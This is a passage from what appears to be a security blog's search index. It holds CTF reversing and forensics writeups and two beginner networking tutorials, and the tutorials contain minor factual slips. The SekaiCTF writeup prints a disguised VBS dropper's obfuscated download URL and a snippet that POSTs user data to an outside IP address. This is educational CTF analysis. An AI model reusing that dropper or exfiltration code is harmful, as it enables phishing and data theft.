parameters which are retrieved from the string resource using identifiers, like (R.string.k1).   So, the implementation of these methods are in native library. Extract the library by either unzipping it or using apktool. So libsl4ydroid.so will be extracted in lib/ folder. Open it in IDA or any other debugging software (I personally prefer IDA) and try to reverse the code. To get the flag, there are more than one approaches that can be followed. I’ll discuss few of them here. First, flag can be found by static analysis but that can be bit complex and time consuming process. If we look at the pseudo code, we can clearly see that it involves a RC4 function: ring. So this hints, we should debug it dynamically. To do dyanmic analysis, we have to set up Remote Android Debugger. For this, either use emulator or your own android device (provided developer mode is on). Through adb, install the apk and start android server (There are many blogs explaining this process, though it is applicable for IDA pro). After successfully setting up the debugger, attach the process (of this apk) and debug the code dynamically now.This process seems bit lengthy and sometimes it can be bit uncertain (as I have gone through it often:) ). Interesting thing to notice in the code is System.out.println(message) under the functions sh4dy, sl4y3r, it4chi and n4ut1lus. It might be possible that these methods are being called from native methods using JNI (can be viewed in IDA). Let’s try to log these results. For this, we use JADX debugger, launch the app on emulator or own device and click Launch App. In logcat, we have our flag. This challenge has surely got some Rizz :) Flag:- flag{RizZZ! Rc4_R3v3r51Ngg_RrR!:}Hope !! You all enjoyed the challenges."
  },
  
  {
    "title": "Networking - Part 2",
    "url": "/posts/Networking-Part-2/",
    "categories": "Blogs, Networking",
    "tags": "Computer Networking",
    "date": "2023-12-15 06:21:40 +0530",
    





    
    "snippet": "Welcome to the other part of Computer Networking. In this part, we’ll be exploring the protocols involved in networking.HTTPHTTP stands for Hypertext Tranfer Protocol. It can be defined as the foun...",
    "content": "Welcome to the other part of Computer Networking. In this part, we’ll be exploring the protocols involved in networking.HTTPHTTP stands for Hypertext Tranfer Protocol. It can be defined as the foundation of communication on the web. It is an application layer protocol, used to transfer information between devices. This protocol involves various request methods and corresponding responses to communicate between clients and servers.Request Methods  GET: Requests data from a specified resource.  POST: Submits data to be processed to a specified resource.  PUT: Updates a resource or creates a new one if it doesn’t exist.  DELETE: Deletes the specified resource.  PATCH: Partially updates a resource.  HEAD: Requests the headers of a resource, similar to GET but without the body.  OPTIONS: Queries the server for available methods on a resource.ResponsesThe server responds to these request methods with status codes, indicating the success or failure of the request.  1xx: Informational - Request received, continuing process.  2xx: Success - Request successfully received, understood, and accepted.  3xx: Redirection - Further action needed to complete the request.  4xx: Client Error - Request contains bad syntax or cannot be fulfilled.  5xx: Server Error - Server failed to fulfill a valid request.Example: 502: Bad Gateway, 500: Internal Server Error, 200: Successful GET request, 201: Successful POST request, 404:URL can’t be found, 102:Processing, 301:Moved Permanently, 305:Use ProxySMTPSMTP stands for Simple Mail Transport Protocol. It is a standard protocol used for sending and receiving emails over the internet. SMTP works between mail servers to handle the sending of emails from the sender’s email client to the recipient’s email server. It operates on TCP port 25 by default. To add more security, modern SMTP servers use SSL (Secure Shell) or TLS (Transport Layer Security) to encrypt the communication and to prevent unauthorized access or interception of emails..How does an SMTP server work?      When we send an email from our email client (like Gmail, Outlook, Yahoo etc.), our email client communicates with our email provider’s SMTP server.        Our email client formats the email according to SMTP standards (including the sender’s address, recipient’s address, subject, message body, and attachments).        The email client establishes a connection to the SMTP server using the SMTP protocol on port 25. It sends the formatted email to the SMTP server.        The SMTP server processes the email, performs checks (such as domain validation), and decides whether to relay the message to another server or deliver it locally (if the recipient is on the same server).        If the recipient is on a different domain, the SMTP server might forward the email to another SMTP server responsible for handling emails for that domain. This process continues until the email reaches the recipient’s SMTP server.        The recipient’s SMTP server receives the email, performs further checks, and places it in the recipient’s mailbox or forwards it to the recipient’s email client for retrieval.  POP/IMAPThese are two standard protocols used by email clients to retrieve emails from a mail server. POP stands for Post Office Protocol. It is an older protocol that downloads the emails from the server and stores them locally on the device. IMAP stands for Internet Message Access Protocol that works in contrast to POP. It keeps emails stored on the server. IMAP is ideal for users who access their emails from multiple devices (such as phones, tablets, and computers) and want their emails to be synchronized across all devices.DHCPDHCP stands for Dynamic Host Configiration Protocol. This protocol automates the assignment of IP addresses and other network configuration to devices in the network especially in the larger network where manually assigning addresses to each device would be impractical. Let’s understand the how it works :-When a device connects to a network, it sends out a broadcast message to a DHCP server on the network requesting an IP address. It manages a pool of available IP addresses and configuration settings. The DHCP server selects an available IP address from its pool and assigns it to the requesting device. This assignment is temporary and is known as a lease. The lease includes a lease duration, specifying how long the IP address is valid for that device. It may also provide additional network configuration information, such as the subnet mask, default gateway, DNS servers, and more. Once the IP address and configuration settings are assigned, DHCP server sends an acknowledgment to the requesting device, confirming the lease.The device can also request a lease renewal from the DHCP server to continue using the same IP address. If the DHCP server approves the renewal, the lease duration is extended.FTPFTP stands for File Transfer Protocol, a standard network protocol for transferring files between server and client on a computer network. It works on a client-server model where client conencts to server to perform file transfers.In the above image, I connected to a FTP server by username and password. By ls command, I listed all the files present on the server (There are some Organic Reactions files of my JEE time :p). Similarly, with send I can send files and with get, I can download the files from the server. There are other commands also related to FTP server.Traditional FTP doesn’t encrypt data during transmission, which may cause security risks. Secure versions like FTPS (FTP Secure) and SFTP (SSH File Transfer Protocol) add encryption for secure data transfer.ARPARP stands for Address Resolution Protocol, that operates at 2nd layer (Data Link Layer). It is used for mapping an IP address to a physical machine address, such as a MAC address in a local network. Let’s understand how ARP works :-When a device wants to communicate with another device on the same local network and knows the IP address but not the MAC address of the destination, it uses ARP to find the MAC address associated with the IP address. The requesting device sends an ARP request packet containing the target IP address across the network. The device that has the corresponding IP address in its ARP cache responds with an ARP reply packet, providing its MAC address and after receiving the reply, the requesting device stores this mapping in its ARP cache or table. This cache helps speed up future communications by avoiding the need for ARP requests for frequently accessed IP addresses.However, ARP cache size is limited by design, so it is purged regularly to free up space.BGP/OSPFBGP stands for Border Gateway Protocol  and OSPF stands for Open Shortest Path First. Both are routing protocols but they operate in different ways.BGP is an exterior gateway protocol (EGP) primarily used to exchange routing information between different autonomous systems (AS) on the internet.What is autonomous system? It is a collection of IP networks and routers under a common administration sharing a single routing policy.The purpose of BGP is to enable routers within different autonomous systems to share information about the best available paths for reaching specific destinations across the internet. It depends on mutliple factors such as network policies, path attributes, and the number of autonomous systems a route passes through.OSPF is an interior gateway protocol (IGP) designed for use within an autonomous system. Its purpose is to determine the best route path within an autonomous system. It is easily configured than BGP which is lot more complex. It also supports faster convergence which helps in effiient routing.TCPTCP stands for Transmission Control Protocol, a connection oriented protocol i.e it establishes a connection between sender and reciever before exchanging data. It ensures reliable, ordered, and error-checked delivery of data packets. TCP guarantees the delivery of data by using acknowledgments and retransmissions. It also include flow control mechanisms to manage the rate of data transmission between devices.Transmission: It refers to the process of sending data from one device to another across a network. Data is broken down into smaller units called packets or framesAcknowledgments (ACK): After sending data, the sender expects confirmation from the receiver that the data arrived intact. This acknowledgment serves as confirmation that the data was successfully received. If the sender does not receive an acknowledgment within a specified time frame or detects packet loss, it retransmits the data to ensure reliable delivery.There is also another flag called SYN which stands for Synchronize. When a device wants to establish a TCP connection with another device, it sends a TCP packet with the SYN flag set in the header. This packet contains an initial sequence number, which is used to start the conversation and synchronize sequence numbers between the sender and receiver.Sequence numbers are unique identifiers assigned to TCP segments to maintain the order and integrity of data transmitted over a connection. They help in reassembling packets in the correct order at the receiver’s end. Each segment of data sent via TCP contains a sequence number, allowing the receiver to arrange and reconstruct the data in the correct order.When a TCP connection is initiated, the SYN flag is set in the first packet sent by the initiating device. This packet includes an initial sequence number. The receiving device responds with its own SYN packet, acknowledging the connection request and also including its own initial sequence number. So the SYN flag is used to synchronize sequence numbers between devices initiating a TCP connection. It marks the beginning of a three-way handshake in TCP, allowing devices to exchange sequence numbers and establish a reliable connection before data transmission begins.The three-way handshake is a fundamental process in the TCP for establishing a reliable connection between two devices over a network. Data transmission can begin after the completion of the three-way handshake.The three steps involved in the TCP three-way handshake are:SYN:    The initiating device sends a TCP segment with the SYN flag set to the receiving device to initiate a connection request. This packet includes an initial sequence number chosen by the client to start the conversation.SYN-ACK:    Upon receiving the SYN segment, if the server is available and willing to establish a connection, it responds with a TCP segment. This segment has both the SYN and ACK flags set, acknowledging the receipt of the client's SYN packet and also indicating its own readiness to establish the connection.    The server also chooses its own initial sequence number for the conversation.ACK:    Finally, the client responds to the server's SYN-ACK packet with an ACK packet. This packet acknowledges the receipt of the server's SYN-ACK segment. At this point, the connection is established and both devices have synchronized sequence numbers.UDPIt stands for User Datagram Protocol, a connection-less protocol i.e. it does not establish a direct connection for data exchange. It sends data packets, called datagrams, without establishing a connection or checking whether the receiver is ready or exists. Unlike TCP, it does not have an error checking mechanism which may result in corruption and loss of data packets. UDP has lower overhead compared to TCP because it lacks the extensive error-checking and flow control mechanisms. This makes it faster and more efficient for real-time applications. It is used where speed and efficiency is prioritized over reliability like video streaming, gaming, DNS lookups and cases where small amount of loss of data is acceptable."
  },
  
  {
    "title": "Networking - Part 1",
    "url": "/posts/Networking-Part-1/",
    "categories": "Blogs, Networking",
    "tags": "Computer Networking, OSI model",
    "date": "2023-12-13 06:21:40 +0530",
    





    
    "snippet": "Hey everyone! This blog covers the basics of computer networking. So let’s start with the fundamental question… Exactly what is a computer network? It’s a network of two or more two devices exchang...",
    "content": "Hey everyone! This blog covers the basics of computer networking. So let’s start with the fundamental question… Exactly what is a computer network? It’s a network of two or more two devices exchanging information and data. Let’s understand this statement with the working of multiple devices connected to a router.Most of us have routers at our homes, and multiple devices (like laptops, smartphones and other devices) are connected to the network provided by ISP (Internet Service Provider). So what happens, ISP assigns an IP address to our router, let’s say 188.2.51.202. This is a global IP address that is unique and is what the outside world uses to identify and communicate with your home network. Our laptop has a local IP address like 192.168.254.11, while your smartphone might have 192.168.254.12, and so on. These are local IP addresses, used within your home network to communicate between devices.Now, our laptop wants to browse the internet. It sends a request, router will use NAT (Network Address Translation). It will replace the local IP of a laptop with the global IP of the router before sending the request to the internet.Here, there is a very important protocol that plays crucial role in assigning local IP addresses to devices dynamically :- DHCP (Dynamic Host Configuration Protocol).Let’s try to understand what IP address and what is the need for it. An IP address acts as a unique identifier for devices in a network, much like a street address pinpoints a particular building in a city. However, to ensure the data reaches the correct application or service on that device, we need something more specific. This is where ports come into play—they’re like room numbers or offices within that building. There are 2^16 ports ranging from 0 to 65535. Ports from 0 to 1023 are reserved. For e.g. port 80 is for HTTP, port 25 is for SMTP. We’ll talk about IP address and protocols in detail later.OSI modelTill now, we have built a fundamental understanding of networking. Let’s dive bit deeper to know more about networking and its complexities. For this, we turn to OSI model (Open System Interconnection model).OSI is a logical model for communication between systems. It was modeled first then protocols were implemented. It is composed of 7 layers, in which each layer is dependent on the layer above and the layer below.Application LayerIt is the topmost layer of the model that serves as an interface between the network and software running on the device. This layer is directly interacted with by users, and it hosts various protocols necessary for specific applications. Examples of application layer protocols include:  Hypertext Transfer Protocol (HTTP): For viewing web pages and accessing web resources.  Domain Name System (DNS): For quickly accessing web pages using names instead of IP addresses.  File Transfer Protocol (FTP): For transferring computer files.  Internet Message Access Protocol (IMAP): For accessing and storing email.  Simple Mail Transfer Protocol (SMTP): For sending outgoing email.Presentation LayerIt is the sixth layer of the model, responsible for the formatting and presentation of data. Its main functions include data translation, encryption and decryption for secure transmission, compression and decompression of data. It ensures that information sent from one system can be read by another system, regardless of differences in data representation.Session LayerThis layer manages and controls the communication between devices. The session layer handles the connection and authentication between a client or server, including actions like logon, lookup, log off, or session termination. DNS, along with name resolution protocols, operate in the session layer..Transport LayerIt is the fourth layer of the OSI model. Transport layer uses protocols like TCP and UDP for data transfer. The functions of this layer include:      Segmentation and ReassemblyThe transport layer breaks down data from the session layer into smaller segments for smooth transmission across the network. It then reassembles these segments into the original message at the receiving end. Protocols like TCP, UDP have different sizes of segments.        Congestion controlThis situation occurs when too many sources attempt to send data over the network, which may result in overflowing router buffers, thus causing the loss of data packets. Transport layer uses mechanisms to control the rate of transmission to prevent congestion and ensure efficient data delivery. For example, the sender is sending data to the receiver at 20 Mbps, but the receiver is not able to process the data at the same rate, so it asks the server for a 3 Mbps rate. This is called congestion control.        Multiplexing and DemultiplexingThe transport layer allows multiple applications to use the network simultaneously by multiplexing data from these applications into a single stream for transmission. At the receiving end, it demultiplexes the received data and directs it to the appropriate application.        Errors checking and correctionIt performs error checking by adding sequence numbers, checksums, or other mechanisms to detect errors in the transmitted data.  Network LayerThis layer is mainly responsible for the logical transmission of data over the entire network. Its main functions include routing, forwarding, and addressing (for identifying devices over the internet).      RoutingRouting is the process of determining the best path for sending data from the source to the destination based on various metrics, such as hop count, bandwidth, delay, or cost.        ForwardingForwarding involves the actual movement of packets from one router’s input interface to the appropriate output interface.  Data Link LayerThis layer divides packets received from the Network layer into frames and then sends them bit-by-bit to the physical layer. It is one of the most complex layers in the OSI model as it hides the complexities of the hardware. This layer also involves physical addressing, enabling the identification of the sender and receiver of frames on the network. Ethernet and Wi-Fi are examples of technologies that operate at the Data Link Layer.Physical LayerIt is the lowest layer in the OSI model that deals with the physical connection between devices and the transmission of raw data bits over a physical medium. It transforms the digital bits received from the Data Link Layer into signals that can be transmitted over the physical medium.Difference between Logical Addressing and Physical AddressingLogical Addressing refers to addressing scheme used to uniquely identify devices within a network at Network Layer. Logical addresses are used for routing data across networks. For e.g.  IP addresses in both IPv4 and IPv6 are examples of logical addresses.Physical Addressing involves unique identification of devices within a network at Data Link layer. For e.g. MAC (Media Access Control) addresses in Ethernet networks and the physical addresses in networks like Wi-Fi are examples of physical addressing.MAC addressIt stands for Media Access Control, a unique identfier address during device manufacturing. MAC is represented as 12-digit hexadecimal number in colon:hexadecimal notation. Each network interface in a device has its own MAC address. For e.g. if a device has both ethernet and wifi, there will be two MAC addresses. MAC address looks like : 00:1A:4C:3B:9D:2EIn this article, we’ve covered the basics of computer networking, including the OSI model. We’ll explore protocols in later parts of this article to build on what we’ve learned."
  },
  
  {
    "title": "CSAW'23 Quals",
    "url": "/posts/CSAW'23-Quals/",
    "categories": "Writeups, Reversing",
    "tags": "reversing",
    "date": "2023-09-18 09:41:40 +0530",
    





    
    "snippet": "I had the privilege of participating in the CSAW’23 Quals CTF as a member of InfosecIITR, and it proved to be a great experience. I am delighted to share the writeups for the reversing challenges m...",
    "content": "I had the privilege of participating in the CSAW’23 Quals CTF as a member of InfosecIITR, and it proved to be a great experience. I am delighted to share the writeups for the reversing challenges my team and I successfully solved during the competition.ReversingRebug1Description:-Can’t seem to print out the flag :( Can you figure out how to get the flag with this binary?Challenge File: fileThis challenge was beginner level reversing challenge. To see the decompiled code, open the provided binary in IDA and press F5.According to the code, the user is expected to input a 12-character string, and if the string length matches, they will receive a flag in response to the input.Now run the binary and give any 12-character input and you’ll get the flag.Flag:- csawctf{c20ad4d76fe97759aa27a0c99bff6710}Rebug2Description:- No input this time ;) Try to get the flag from the binary. When you find the answer of the program, please submit the flag in the following format: csawctf{output}Challenge File: fileThis time, there is no need of input as it was in Rebug1. So let’s have a look at the source code first. Open the binary in IDA and decompile it (pressing F5).Initially, a string is provided to us which undergoes certain operations and then another function printbincharis called only when (i &amp; 1) == 0 &amp;&amp; i -this condition is satisfied (i should be even and non-zero). Now look at printbinchar function.In this function, v4&lt;&lt;i&gt;&gt;7 a left shift operation is done which shifts its bits left by i positions and then right shift operation which shift its bits right by 7. The purpose of this function is to represent a char in in its binary form. But here again another function xoring is being called. Here, its pseudo-code :-Now, we have almost reached to our final destination. If above conditions are met, then ‘0’ will be added to our flag and if not, then ‘1’. So, to get flag, I just copied the above pseudo-code and modified it. I added print(flag) and ran it. Here it is- fileFlag:- csawctf{01011100010001110000}ImpossibrawlerDescription:- How do I beat these guys ?Challenge File: file1 file2This game was based on game-reversing. It was a nice challenge as it made me to spend a lot of time as I overlooked something very basic. So let’s discuss:-First, I ran the .exe file and found the flag was only accessible after completing two levels, but main catch here was, the bullets which player was firing were not causing the damage to enemies and thus their health remained constant. So in short, game was unbeatable by human(atleast for me as I’m very bad at gaming) to get flag.I first approached it by Cheat Engine to get control over required variables and I tried searching for strings too.. but it was not of any help. Then I tried to extract files from exe itself but it was also a futile effort. Then I thought about the game-engine used:- Godot Engine. I googled about godot engine game reversing and got this helpful tool- link. I used .pck file for unpacking my game and successfully recovered the project files.In level_2 script, when enemies_left == 0 range of a random number generator is seeded with the value obtained from int(Vals.sd) after which random floating number is generated, fbytes is converted to string. Flag is obtained by converting fbytes to ascii followed by hex encoding. Since Vals.sd is required, so I looked in level_1 script to check whether it was being updated. Yes, in level_1, Vals.sd was storing fbytes when enemies_left == 0. Initially vals.sd was set 0. The basic thing I overlooked the functionality of randf() which returns values between 0 and 1, so it does not matter whether vals.sd is updated or not because in level_2 it is casted into int type which makes it 0. var rng = RandomNumberGenerator.new() rng.seed = 0 var fbytes = rng.randf() fbytes = str(fbytes)   print(fbytes)Output is 0.202272. For flag, convert this to ascii and then in hex, i.e., 302e323032323732. This is our flag.Flag:- csawctf{302e323032323732}MiscAndroidDropperDescription:- The app does nothing!Challenge File: fileThis was an easy android reversing based challenge. For android reversing, I use jadx tool to view the source code. In jadx, navigate to com.example.dropper and here the code is :-Some base64 encoded data is given which is written to dropper.dex after being decoded. I did the same, decoded the data, got the .dex file content. Then to analyze the dex file, I ran jadx -d d_jadx dropper.dex command.Now, there is a link given in code, clicking on it, gave base64 data. Decoding base64 data is stored in notTheFlag variable and obf function is now called. So, we got the flag, using decoded data, which is passed in obf.Flag:- csawctf{dyn4m1c_lo4deRs_r_fuN!}"
  },
  
  {
    "title": "SekaiCTF 2023 - DEFCON Invitation",
    "url": "/posts/SekaiCTF-2023-DEFCON-Invitation/",
    "categories": "Writeups, Forensics",
    "tags": "Forensics",
    "date": "2023-08-28 06:21:40 +0530",
    





    
    "snippet": "Description:-As you all know, DEF CON CTF Qualifier 2023 was really competitive and we didn’t make it. Surprisingly, 2 months before the finals in Las Vegas, we received an official invitation from...",
    "content": "Description:-As you all know, DEF CON CTF Qualifier 2023 was really competitive and we didn’t make it. Surprisingly, 2 months before the finals in Las Vegas, we received an official invitation from Nautilus Institute to attend the event. Should we accept the invitation and schedule the trip?Challenge File: fileIn this challenge, a .eml file is provided which is commonly used for storing email messages. On opening this email, there was an attachment (calendar invitation). It is a .ics file which is for iCalendar files. In this, I got two links :- https://nautilus.org/ and https://storage.googleapis.com/defcon-nautilus/venue-guide.html. So, I opened both links. In first one, I got nothing but in second, I got something - Caesars Forum Venue Map and there was a download option for map, I downloaded that but to my surprise it was vbs script and now this challenge has been reduced to a vbs script based challenge.Now analysis part of vbs script starts…In this, I found this.. and deobsfucating   ewkjunfw = Replace(\"68IlllIllIIIllllIllII74IlllIllIIIllllIllII74IlllIllIIIllllIllII70IlllIllIIIllllIllII73IlllIllIIIllllIllII3aIlllIllIIIllllIllII2fIlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII6fIlllIllIIIllllIllII77IlllIllIIIllllIllII6eIlllIllIIIllllIllII6cIlllIllIIIllllIllII6fIlllIllIIIllllIllII61IlllIllIIIllllIllII64IlllIllIIIllllIllII31IlllIllIIIllllIllII36IlllIllIIIllllIllII34IlllIllIIIllllIllII37IlllIllIIIllllIllII2eIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII66IlllIllIIIllllIllII69IlllIllIIIllllIllII72IlllIllIIIllllIllII65IlllIllIIIllllIllII2eIlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6dIlllIllIIIllllIllII2fIlllIllIIIllllIllII6cIlllIllIIIllllIllII31IlllIllIIIllllIllII38IlllIllIIIllllIllII38IlllIllIIIllllIllII75IlllIllIIIllllIllII32IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII71IlllIllIIIllllIllII67IlllIllIIIllllIllII33IlllIllIIIllllIllII66IlllIllIIIllllIllII4fIlllIllIIIllllIllII6fIlllIllIIIllllIllII4cIlllIllIIIllllIllII70IlllIllIIIllllIllII69IlllIllIIIllllIllII6cIlllIllIIIllllIllII63IlllIllIIIllllIllII49IlllIllIIIllllIllII38IlllIllIIIllllIllII39IlllIllIIIllllIllII70IlllIllIIIllllIllII30IlllIllIIIllllIllII5fIlllIllIIIllllIllII68IlllIllIIIllllIllII34IlllIllIIIllllIllII45IlllIllIIIllllIllII30IlllIllIIIllllIllII63IlllIllIIIllllIllII47IlllIllIIIllllIllII4cIlllIllIIIllllIllII6aIlllIllIIIllllIllII6bIlllIllIIIllllIllII5fIlllIllIIIllllIllII75IlllIllIIIllllIllII76IlllIllIIIllllIllII42IlllIllIIIllllIllII55IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII45IlllIllIIIllllIllII5fIlllIllIIIllllIllII72IlllIllIIIllllIllII4dIlllIllIIIllllIllII5aIlllIllIIIllllIllII2dIlllIllIIIllllIllII48IlllIllIIIllllIllII35IlllIllIIIllllIllII2dIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII39IlllIllIIIllllIllII4bIlllIllIIIllllIllII72IlllIllIIIllllIllII39IlllIllIIIllllIllII53IlllIllIIIllllIllII51IlllIllIIIllllIllII4cIlllIllIIIllllIllII56IlllIllIIIllllIllII51IlllIllIIIllllIllII61IlllIllIIIllllIllII4bIlllIllIIIllllIllII53IlllIllIIIllllIllII69IlllIllIIIllllIllII4bIlllIllIIIllllIllII63IlllIllIIIllllIllII45IlllIllIIIllllIllII76IlllIllIIIllllIllII4aIlllIllIIIllllIllII4fIlllIllIIIllllIllII2dIlllIllIIIllllIllII45IlllIllIIIllllIllII6bIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII53IlllIllIIIllllIllII55IlllIllIIIllllIllII71IlllIllIIIllllIllII57IlllIllIIIllllIllII6cIlllIllIIIllllIllII72IlllIllIIIllllIllII4eIlllIllIIIllllIllII36IlllIllIIIllllIllII53IlllIllIIIllllIllII7aIlllIllIIIllllIllII58IlllIllIIIllllIllII67IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII4cIlllIllIIIllllIllII59IlllIllIIIllllIllII42IlllIllIIIllllIllII68IlllIllIIIllllIllII2dIlllIllIIIllllIllII46IlllIllIIIllllIllII35IlllIllIIIllllIllII65IlllIllIIIllllIllII6dIlllIllIIIllllIllII34IlllIllIIIllllIllII49IlllIllIIIllllIllII41IlllIllIIIllllIllII34IlllIllIIIllllIllII69IlllIllIIIllllIllII58IlllIllIIIllllIllII33IlllIllIIIllllIllII74IlllIllIIIllllIllII4fIlllIllIIIllllIllII49IlllIllIIIllllIllII47IlllIllIIIllllIllII68IlllIllIIIllllIllII30IlllIllIIIllllIllII45IlllIllIIIllllIllII6aIlllIllIIIllllIllII34IlllIllIIIllllIllII36IlllIllIIIllllIllII47IlllIllIIIllllIllII6cIlllIllIIIllllIllII77IlllIllIIIllllIllII76IlllIllIIIllllIllII4cIlllIllIIIllllIllII4fIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII38IlllIllIIIllllIllII70IlllIllIIIllllIllII7aIlllIllIIIllllIllII76IlllIllIIIllllIllII75IlllIllIIIllllIllII79IlllIllIIIllllIllII39IlllIllIIIllllIllII31IlllIllIIIllllIllII55IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII6aIlllIllIIIllllIllII31IlllIllIIIllllIllII72IlllIllIIIllllIllII32IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII6aIlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII59IlllIllIIIllllIllII73IlllIllIIIllllIllII55IlllIllIIIllllIllII4eIlllIllIIIllllIllII63IlllIllIIIllllIllII73IlllIllIIIllllIllII73IlllIllIIIllllIllII50IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII30IlllIllIIIllllIllII38IlllIllIIIllllIllII64IlllIllIIIllllIllII73IlllIllIIIllllIllII6bIlllIllIIIllllIllII57IlllIllIIIllllIllII52IlllIllIIIllllIllII70IlllIllIIIllllIllII6bIlllIllIIIllllIllII41IlllIllIIIllllIllII49IlllIllIIIllllIllII2fIlllIllIIIllllIllII79IlllIllIIIllllIllII65IlllIllIIIllllIllII61IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII35IlllIllIIIllllIllII68IlllIllIIIllllIllII76IlllIllIIIllllIllII67IlllIllIIIllllIllII70IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII76IlllIllIIIllllIllII6dIlllIllIIIllllIllII76IlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII65IlllIllIIIllllIllII66IlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6eIlllIllIIIllllIllII2dIlllIllIIIllllIllII66IlllIllIIIllllIllII6cIlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII70IlllIllIIIllllIllII6eIlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII58IlllIllIIIllllIllII4fIlllIllIIIllllIllII52IlllIllIIIllllIllII65IlllIllIIIllllIllII64\", \"IlllIllIIIllllIllII\", \" \")It results in 'https://download1647.mediafire.com/l188u2d532qg3fOoLpilcI89p0_h4E0cGLjk_uvBUiag7E_rMZ-H5-me9Kr9SQLVQaKSiKcEvJO-EkfTSUqWlrN6SzXgI0LYBh-F5em4IA4iX3tOIGh0Ej46GlwvLOfT8pzvuy91Utej1r2I0jg7YsUNcssPted508dskWRpkAI/yea535hvgp32vmv/defcon-flag.png.XORed'Yes, I was going right.. now I have flag.png xored and need key with which I can get my flag.  StRREVErsE(replace(\"=QWZ###############_###lWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcp###############_###Y\", \"###############_###\", \"z\"))It results in c:\\temp\\defcon-flag.png.compromised.Now search operation for key starts…So, we have to deobfuscate this vbs script. For this, I used vbsedit and it gave Dim http: Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") Dim url: url = \"http://20.106.250.46/sendUserData\" With http  Call .Open(\"POST\", url, False)  Call .SetRequestHeader(\"Content-Type\", \"application/json\")  Call .Send(\"{\"\"username\"\":\"\"\" &amp; strUser &amp; \"\"\"}\") End With res = Msgbox(\"Thank you for your cooperation!\", vbOKOnly+vbInformation, \"\")From above snippet, it seems that POST request is to be sent to the given URL, after setting request header Content-Type to application/json and sending json payload {   \"username\":\"admin\" }   I set username to admin and bravo !! I got the key..So with the key we XORed the downloaded XORed flag.png and yesss.. we got the flag !! Flag :- SEKAI{so_i_guess_we'll_get_more_better_next_year-_-}"
  }
  
]

